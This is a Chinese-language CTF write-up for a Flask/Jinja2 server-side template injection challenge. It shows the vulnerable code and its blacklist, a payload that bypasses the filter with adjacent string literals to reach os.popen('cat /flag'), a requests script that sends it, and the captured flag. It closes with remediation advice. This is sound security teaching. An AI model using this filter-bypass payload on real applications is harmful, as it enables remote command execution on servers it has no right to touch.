# week4还没有对象吧，快来new一个python对象

## 题目简述

Flask 应用把 `search` 查询参数直接拼进 `render_template_string()`，形成 Jinja2 SSTI。黑名单禁止连续出现 `class`、`__`、反斜杠、`attr` 和加号，但 Jinja2 支持相邻字符串字面量自动拼接，并允许用下标语法访问属性，因此可以稳定绕过过滤并调用 `os.popen()`。

## 解题过程

仓库源码的核心逻辑为：

```python
search = request.args.get("search") or "None"
blacklist = ["class", "+", "__", "\\", "attr"]
for word in blacklist:
    if word in search:
        abort(500)
return render_template_string("Searching for: %s?" % search)
```

先提交 `{{7*7}}`，页面回显 `49`，确认模板表达式可执行。Jinja2 默认全局对象 `cycler` 的初始化函数全局变量中包含 `os`。将 `__init__` 和 `__globals__` 拆成相邻字符串，解析时会自动拼回完整属性名，但原始输入不含连续的 `__`：

```jinja
{{cycler['_' '_init_' '_']['_' '_globals_' '_']['os'].popen('cat /flag').read()}}
```

用 HTTP 客户端的查询参数功能发送，避免手工 URL 编码破坏花括号和引号：

```python
import requests

payload = "{{cycler['_' '_init_' '_']['_' '_globals_' '_']['os'].popen('cat /flag').read()}}"
response = requests.get(
    "http://challenge/",
    params={"search": payload},
    timeout=5,
)
print(response.text)
```

响应中得到：

```text
0xGame{fl4sk_sst1_ju5t_5o_s0,r1ght?}
```

## 方法总结

本题的关键不是记忆依赖环境的 `__subclasses__()[189]`，而是理解 Jinja2 的属性回退与字符串拼接语义，选择稳定的模板全局对象到命令执行路径。字符黑名单无法可靠防御 SSTI；修复应使用固定模板并把用户输入作为数据变量传入，绝不能拼接到模板源代码中。
